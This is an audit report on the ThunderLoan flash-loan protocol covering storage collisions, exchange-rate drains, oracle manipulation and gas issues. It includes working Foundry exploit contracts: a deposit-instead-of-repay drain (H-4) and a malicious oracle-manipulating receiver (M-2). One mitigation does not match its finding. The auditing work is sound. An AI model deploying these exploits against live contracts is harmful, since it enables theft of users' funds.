## High

### [H-1] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`

**Description:** `ThunderLoan.sol` has two variables in the following order:
```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```
However, the expected upgraded contract ThunderLoanUpgraded.sol has them in a different order.
```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```
Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts.

**Impact:**  After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.

**Proof of Concept:** Add the following code to the `ThunderLoanTest.t.sol` file.
<details>
<summary>Code</summary>

```javascript
//You will need to import `ThunderLoanUpgraded` file
function testUpgradeBreaks() public{
        uint256 feeBeforeUpgrade=thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded=new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded),"");
        uint256 feeAfterUpgrade=thunderLoan.getFee();
        vm.stopPrank();
        assert(feeBeforeUpgrade!=feeAfterUpgrade);
    }
```
</details>

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`.

**Recommended Mitigation:** Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In `ThunderLoanUpgraded.sol`:

```diff
-    uint256 private s_flashLoanFee; // 0.3% ETH fee
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee; 
+    uint256 public constant FEE_PRECISION = 1e18;
```

### [H-2] Unnecessary `updateExchangeRate` in `deposit` function incorrectly updates exchangeRate preventing withdraws and unfairly changing reward distribution.

**Description:** Asset tokens gain interest when people take out flash loans with the underlying tokens. In current version of ThunderLoan, exchange rate is also updated when user deposits underlying tokens.

This does not match with documentation and will end up causing exchange rate to increase on deposit.

This will allow anyone who deposits to immediately withdraw and get more tokens back than they deposited. Underlying of any asset token can be completely drained in this manner.

**Impact:** Users can deposit and immediately withdraw more funds. Since `exchangeRate` is increased on `deposit`, they will withdraw more funds then they deposited without any flash loans being taken at all.

**Proof of Code:** Please add below test case in `ThunderLoanTest.t.sol` file.
```javascript
function testExchangeRateUpdatedOnDeposit() public setAllowedToken {
	tokenA.mint(liquidityProvider, AMOUNT);
	tokenA.mint(user, AMOUNT);

	// deposit some tokenA into ThunderLoan
	vm.startPrank(liquidityProvider);
	tokenA.approve(address(thunderLoan), AMOUNT);
	thunderLoan.deposit(tokenA, AMOUNT);
	vm.stopPrank();

	// another user also makes a deposit
	vm.startPrank(user);
	tokenA.approve(address(thunderLoan), AMOUNT);
	thunderLoan.deposit(tokenA, AMOUNT);
	vm.stopPrank();        

	AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

	// after a deposit, asset token's exchange rate has aleady increased
	// this is only supposed to happen when users take flash loans with underlying
	assertGt(assetToken.getExchangeRate(), 1 * assetToken.EXCHANGE_RATE_PRECISION());

	// now liquidityProvider withdraws and gets more back because exchange
	// rate is increased but no flash loans were taken out yet
	// repeatedly doing this could drain all underlying for any asset token
	vm.startPrank(liquidityProvider);
	thunderLoan.redeem(tokenA, assetToken.balanceOf(liquidityProvider));
	vm.stopPrank();

	assertGt(tokenA.balanceOf(liquidityProvider), AMOUNT);
}
```
**Recommended Mitigation:** Do not update exchangeRate on `deposit` function  and updated it only when flash loans are taken.
```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
	AssetToken assetToken = s_tokenToAssetToken[token];
	uint256 exchangeRate = assetToken.getExchangeRate();
	uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
	emit Deposit(msg.sender, token, amount);
	assetToken.mint(msg.sender, mintAmount);
-	uint256 calculatedFee = getCalculatedFee(token, amount);
-	assetToken.updateExchangeRate(calculatedFee);
	token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```

### [H-3] Fee's are lesser for non-standard ERC20 Tokens

**Description:** `ThunderLoan::getCalculatedFee()` and `ThunderLoanUpgraded::getCalculatedFee()` functions, an issue arises with the calculated fee value when dealing with non-standard ERC20 tokens. Specifically, the calculated value for non-standard tokens appears significantly lower compared to that of standard ERC20 tokens.

**Impact:** Resulting this ,Malicious Users can get lowe fees especially non-standard ERC20 tokens.
```javascript
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
        
        //1 ETH = 1e18 WEI
        //2000 USDT = 2 * 1e9 WEI

        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;

        // valueOfBorrowedToken ETH = 1e18 * 1e18 / 1e18 WEI
        // valueOfBorrowedToken USDT= 2 * 1e9 * 1e18 / 1e18 WEI

        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;

        //fee ETH = 1e18 * 3e15 / 1e18 = 3e15 WEI = 0,003 ETH
        //fee USDT: 2 * 1e9 * 3e15 / 1e18 = 6e6 WEI = 0,000000000006 ETH
    }
```
The fee for the user_2 are much lower then user_1 despite they asks a flashloan for the same value (hypotesis 1 ETH = 2000 USDT).

**Recommended Mitigation:**  Adjust the precision accordinly with the allowed tokens considering that the non standard ERC20 haven't 18 decimals.


### [H-4] All the funds can be stolen if the flash loan is returned using deposit()

**Description:** An attacker can acquire a flash loan and deposit funds directly into the contract using the `deposit`, enabling stealing all the funds.
The `flashloan` performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing endingBalance with `startingBalance + fee`. However, a vulnerability emerges when calculating `endingBalance` using `token.balanceOf(address(assetToken))`.

Exploiting this vulnerability, an attacker can return the flash loan using the `deposit` instead of `repay`. This action allows the attacker to mint AssetToken and subsequently redeem it using `redeem`. What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger

**Impact:** All the funds can stolen untill contract get drained.

**Proof of Concept:** Please add the follwoing test case in `ThunderLoanTest.t.sol` file.
```javascript
//Keep this function within the `ThunderLoanTest` contract
    function testUseDepositInsteadOfRepaytoStealFunds() public setAllowedToken hasDeposits{
        vm.startPrank(user);
        uint256 amountToBorrow=50e18;
        uint256 fee=thunderLoan.getCalculatedFee(tokenA,amountToBorrow);
        DeployOverRepay dor=new DeployOverRepay(address(thunderLoan));
        tokenA.mint(address(dor),fee);

        thunderLoan.flashloan(address(dor),tokenA,amountToBorrow,"");
        dor.redeemMoney();
        vm.stopPrank();
        assert(tokenA.balanceOf(address(dor))>50e18+fee);
    }

//Write another contract within the same file 

contract DeployOverRepay is IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderloan){
        thunderLoan=ThunderLoan(_thunderloan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool){
        s_token=IERC20(token);
        assetToken=thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan),amount+fee);
        thunderLoan.deposit(IERC20(token),amount+fee);
        return true;
    }

    function redeemMoney() public{
        uint256 amount=assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token,amount);
    }

}

```
**Recommended Mitigation:**  Add a check in `deposit` to make it impossible to use it in the same block of the flash loan. For example registring the `block.number` in a variable in `flashloan` and checking it in `deposit`.

## Medium 

### [M-1] `ThunderLoan::setAllowedToken` can permanently lock liquidity providers out from redeeming their tokens.

**Description:** If the `ThunderLoan::setAllowedToken` function is called with the intention of setting an allowed token to false and thus `deleting` the assetToken to token mapping; nobody would be able to redeem funds of that token in the `ThunderLoan::redeem` function and thus have them locked away without access.
If the owner sets an allowed token to false, this deletes the mapping of the asset token to that ERC20. If this is done, and a liquidity provider has already deposited ERC20 tokens of that type, then the liquidity provider will not be able to redeem them in the `ThunderLoan::redeem` function.

```javascript
     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
        if (allowed) {
            if (address(s_tokenToAssetToken[token]) != address(0)) {
                revert ThunderLoan__AlreadyAllowed();
            }
            string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
            string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
            AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
            s_tokenToAssetToken[token] = assetToken;
            emit AllowedTokenSet(token, assetToken, allowed);
            return assetToken;
        } else {
            AssetToken assetToken = s_tokenToAssetToken[token];
@>          delete s_tokenToAssetToken[token];
            emit AllowedTokenSet(token, assetToken, allowed);
            return assetToken;
        }
    }

         function redeem(
        IERC20 token,
        uint256 amountOfAssetToken
    )
        external
        revertIfZero(amountOfAssetToken)
@>      revertIfNotAllowedToken(token)
    {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        if (amountOfAssetToken == type(uint256).max) {
            amountOfAssetToken = assetToken.balanceOf(msg.sender);
        }
        uint256 amountUnderlying = (amountOfAssetToken * exchangeRate) / assetToken.EXCHANGE_RATE_PRECISION();
        emit Redeemed(msg.sender, token, amountOfAssetToken, amountUnderlying);
        assetToken.burn(msg.sender, amountOfAssetToken);
        assetToken.transferUnderlyingTo(msg.sender, amountUnderlying);
    }
```

**Impact:** liquidity provider cannot redeem their deposited tokens if the `setAllowedToken` is set to false, Locking them out of their tokens.

**Proof of Concept:** Add the below test case in `ThundrLoanTest.t.sol` file 

```javascript
function testCannotRedeemNonAllowedTokenAfterDepositingToken() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);

        tokenA.mint(liquidityProvider, AMOUNT);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, false);

        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, AMOUNT);
        vm.stopPrank();
    }
```

**Recommended Mitigation:**  It would be suggested to add a check if that assetToken holds any balance of the ERC20, if so, then you cannot remove the mapping.

```diff
     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
        if (allowed) {
            if (address(s_tokenToAssetToken[token]) != address(0)) {
                revert ThunderLoan__AlreadyAllowed();
            }
            string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
            string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
            AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
            s_tokenToAssetToken[token] = assetToken;
            emit AllowedTokenSet(token, assetToken, allowed);
            return assetToken;
        } else {
            AssetToken assetToken = s_tokenToAssetToken[token];
+           uint256 hasTokenBalance = IERC20(token).balanceOf(address(assetToken));
+           if (hasTokenBalance == 0) {
                delete s_tokenToAssetToken[token];
                emit AllowedTokenSet(token, assetToken, allowed);
+           }
            return assetToken;
        }
    }

```

### [M-2] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity.

**Proof of Concept:**
The following all happens in 1 transaction.

1. User takes a flash loan from ThunderLoan for 1000 tokenA. They are charged the original fee fee1. During the flash loan, they do the following:
    1. User sells 1000 tokenA, tanking the price.
    2. Instead of repaying right away, the user takes out another flash loan for another 1000 tokenA.
Due to the fact that the way ThunderLoan calculates price based on the TSwapPool this second flash loan is substantially cheaper.

```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```
2. The user then repays the first flash loan, and then repays the second flash loan.
3. Please add below test case in the `ThunderLoanTest.t.sol` file.
   
```javascript
function testOracleManipulation() public{
        //1.Contract Setups
        thunderLoan=new ThunderLoan();
        tokenA=new ERC20Mock();
        proxy=new ERC1967Proxy(address(thunderLoan),"");


        BuffMockPoolFactory pf=new BuffMockPoolFactory(address(weth));
        // create a TSwao DEX between weth and tokenA
        address tswapPool=pf.createPool(address(tokenA));
        thunderLoan=ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));


        //2.Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider,100e18);
        tokenA.approve(address(tswapPool),100e18);
        weth.mint(liquidityProvider,100e18);
        weth.approve(address(tswapPool),100e18);
        BuffMockTSwap(tswapPool).deposit(100e18,100e18,100e18, block.timestamp);
        //Now the Ration 100 WETH / 100 tokenA
        vm.stopPrank();


        //3.Fund ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA,true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider,1000e18);
        tokenA.approve(address(thunderLoan),1000e18);
        thunderLoan.deposit(tokenA,1000e18);
        vm.stopPrank();
       
       // 100 tokenA & 100 weth in TSwap
       // 1000e18 tokenA in ThunderLoan
       // Take out a flash loan of 50 tokenA
       // swap it on the DEX,taking the price > 150 TokenA -> ~80  weth
       // Take out another flash loan of 50 tokenA (and we will see how much cheaper)


       //4.We are going to take 2 flash loans
       //  a.To nuke the price of the Weth/tokenA on tswap
       //  b.To show that doing greatly reduce the fee we pay on thunderloan


       uint256 normalFeeCost=thunderLoan.getCalculatedFee(tokenA,100e18);
       console.log(normalFeeCost);
       //0.296147410319118389 Now lets reduce this


       uint256 amountToBorrow=50e18; // we doign this twice
       MaliciousFlashLoanReceiver flr=new MaliciousFlashLoanReceiver(address(tswapPool),address(thunderLoan),address(thunderLoan.getAssetFromToken(tokenA)));
       vm.startPrank(user);
       tokenA.mint(address(flr),100e18);
       thunderLoan.flashloan(address(flr),tokenA,amountToBorrow,"");
       vm.stopPrank();


       uint256 attackFee=flr.feeOne()+flr.feeTwo();
       console.log("Attack Fee is : ", attackFee);
       assert(attackFee<normalFeeCost);
    }

    contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    bool attacked;
    BuffMockTSwap pool;
    ThunderLoan thunderLoan;
    address repayAddress;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address tswapPool, address _thunderLoan, address _repayAddress) {
        pool = BuffMockTSwap(tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 expected = pool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(pool), 50e18);
            pool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, expected, block.timestamp);
            // we call a 2nd flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // Repay at the end
            // We can't repay back! Whoops!
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // IThunderLoan(address(thunderLoan)).repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            feeTwo = fee;
            // We can't repay back! Whoops!
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // IThunderLoan(address(thunderLoan)).repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
```
   
**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.


## Low

## L-1: Centralization Risk for trusted owners

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

<details><summary>6 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 242](src/protocol/ThunderLoan.sol#L242)

    ```solidity
        function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 268](src/protocol/ThunderLoan.sol#L268)

    ```solidity
        function updateFlashLoanFee(uint256 newFee) external onlyOwner {
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 295](src/protocol/ThunderLoan.sol#L295)

    ```solidity
        function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 241](src/upgradedProtocol/ThunderLoanUpgraded.sol#L241)

    ```solidity
        function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 267](src/upgradedProtocol/ThunderLoanUpgraded.sol#L267)

    ```solidity
        function updateFlashLoanFee(uint256 newFee) external onlyOwner {
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 290](src/upgradedProtocol/ThunderLoanUpgraded.sol#L290)

    ```solidity
        function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
    ```

</details>



## L-2: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>1 Found Instances</summary>


- Found in src/protocol/OracleUpgradeable.sol [Line: 16](src/protocol/OracleUpgradeable.sol#L16)

    ```solidity
            s_poolFactory = poolFactoryAddress;
    ```

</details>



## L-3: `public` functions not used internally could be marked `external`

Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

<details><summary>6 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 234](src/protocol/ThunderLoan.sol#L234)

    ```solidity
        function repay(IERC20 token, uint256 amount) public {
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 279](src/protocol/ThunderLoan.sol#L279)

    ```solidity
        function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 283](src/protocol/ThunderLoan.sol#L283)

    ```solidity
        function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 233](src/upgradedProtocol/ThunderLoanUpgraded.sol#L233)

    ```solidity
        function repay(IERC20 token, uint256 amount) public {
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 278](src/upgradedProtocol/ThunderLoanUpgraded.sol#L278)

    ```solidity
        function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 282](src/upgradedProtocol/ThunderLoanUpgraded.sol#L282)

    ```solidity
        function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
    ```

</details>



## L-4: Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

<details><summary>9 Found Instances</summary>


- Found in src/protocol/AssetToken.sol [Line: 31](src/protocol/AssetToken.sol#L31)

    ```solidity
        event ExchangeRateUpdated(uint256 newExchangeRate);
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 108](src/protocol/ThunderLoan.sol#L108)

    ```solidity
        event Deposit(address indexed account, IERC20 indexed token, uint256 amount);
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 109](src/protocol/ThunderLoan.sol#L109)

    ```solidity
        event AllowedTokenSet(IERC20 indexed token, AssetToken indexed asset, bool allowed);
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 110](src/protocol/ThunderLoan.sol#L110)

    ```solidity
        event Redeemed(
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 113](src/protocol/ThunderLoan.sol#L113)

    ```solidity
        event FlashLoan(address indexed receiverAddress, IERC20 indexed token, uint256 amount, uint256 fee, bytes params);
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 108](src/upgradedProtocol/ThunderLoanUpgraded.sol#L108)

    ```solidity
        event Deposit(address indexed account, IERC20 indexed token, uint256 amount);
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 109](src/upgradedProtocol/ThunderLoanUpgraded.sol#L109)

    ```solidity
        event AllowedTokenSet(IERC20 indexed token, AssetToken indexed asset, bool allowed);
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 110](src/upgradedProtocol/ThunderLoanUpgraded.sol#L110)

    ```solidity
        event Redeemed(
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 113](src/upgradedProtocol/ThunderLoanUpgraded.sol#L113)

    ```solidity
        event FlashLoan(address indexed receiverAddress, IERC20 indexed token, uint256 amount, uint256 fee, bytes params);
    ```

</details>



## L-5: PUSH0 is not supported by all chains

Solc compiler version 0.8.20 switches the default target EVM version to Shanghai, which means that the generated bytecode will include PUSH0 opcodes. Be sure to select the appropriate EVM version in case you intend to deploy on a chain other than mainnet like L2 chains that may not support PUSH0, otherwise deployment of your contracts will fail.

<details><summary>8 Found Instances</summary>


- Found in src/interfaces/IFlashLoanReceiver.sol [Line: 2](src/interfaces/IFlashLoanReceiver.sol#L2)

    ```solidity
    pragma solidity 0.8.20;
    ```

- Found in src/interfaces/IPoolFactory.sol [Line: 2](src/interfaces/IPoolFactory.sol#L2)

    ```solidity
    pragma solidity 0.8.20;
    ```

- Found in src/interfaces/ITSwapPool.sol [Line: 2](src/interfaces/ITSwapPool.sol#L2)

    ```solidity
    pragma solidity 0.8.20;
    ```

- Found in src/interfaces/IThunderLoan.sol [Line: 2](src/interfaces/IThunderLoan.sol#L2)

    ```solidity
    pragma solidity 0.8.20;
    ```

- Found in src/protocol/AssetToken.sol [Line: 2](src/protocol/AssetToken.sol#L2)

    ```solidity
    pragma solidity 0.8.20;
    ```

- Found in src/protocol/OracleUpgradeable.sol [Line: 2](src/protocol/OracleUpgradeable.sol#L2)

    ```solidity
    pragma solidity 0.8.20;
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 64](src/protocol/ThunderLoan.sol#L64)

    ```solidity
    pragma solidity 0.8.20;
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 64](src/upgradedProtocol/ThunderLoanUpgraded.sol#L64)

    ```solidity
    pragma solidity 0.8.20;
    ```

</details>



## L-6: Empty Block

Consider removing empty blocks.

<details><summary>2 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 295](src/protocol/ThunderLoan.sol#L295)

    ```solidity
        function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 290](src/upgradedProtocol/ThunderLoanUpgraded.sol#L290)

    ```solidity
        function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
    ```

</details>



## L-7: Unused Custom Error

it is recommended that the definition be removed when custom error is unused

<details><summary>2 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 87](src/protocol/ThunderLoan.sol#L87)

    ```solidity
        error ThunderLoan__ExhangeRateCanOnlyIncrease();
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 87](src/upgradedProtocol/ThunderLoanUpgraded.sol#L87)

    ```solidity
        error ThunderLoan__ExhangeRateCanOnlyIncrease();
    ```

</details>

## Informational

### [I-1] Not using __gap[50] for future storage collision mitigation

### [I-2] Different decimals may cause confusion. ie: AssetToken has 18, but asset has 6

### [I-3] Doesn't follow https://eips.ethereum.org/EIPS/eip-3156

**Recommended Mitigation:** Aim to get test coverage up to over 90% for all files.

## Gas

### [G-1] Using bools for storage incurs overhead
Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).

*Instances (1)*:
```solidity
File: src/protocol/ThunderLoan.sol

98:     mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;

```

### [G-2] Using `private` rather than `public` for constants, saves gas
If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table

*Instances (3)*:
```solidity
File: src/protocol/AssetToken.sol

25:     uint256 public constant EXCHANGE_RATE_PRECISION = 1e18;

```

```solidity
File: src/protocol/ThunderLoan.sol

95:     uint256 public constant FLASH_LOAN_FEE = 3e15; // 0.3% ETH fee

96:     uint256 public constant FEE_PRECISION = 1e18;

```

### [G-3] Unnecessary SLOAD when logging new exchange rate

In `AssetToken::updateExchangeRate`, after writing the `newExchangeRate` to storage, the function reads the value from storage again to log it in the `ExchangeRateUpdated` event. 

To avoid the unnecessary SLOAD, you can log the value of `newExchangeRate`.

```diff
  s_exchangeRate = newExchangeRate;
- emit ExchangeRateUpdated(s_exchangeRate);
+ emit ExchangeRateUpdated(newExchangeRate);
```



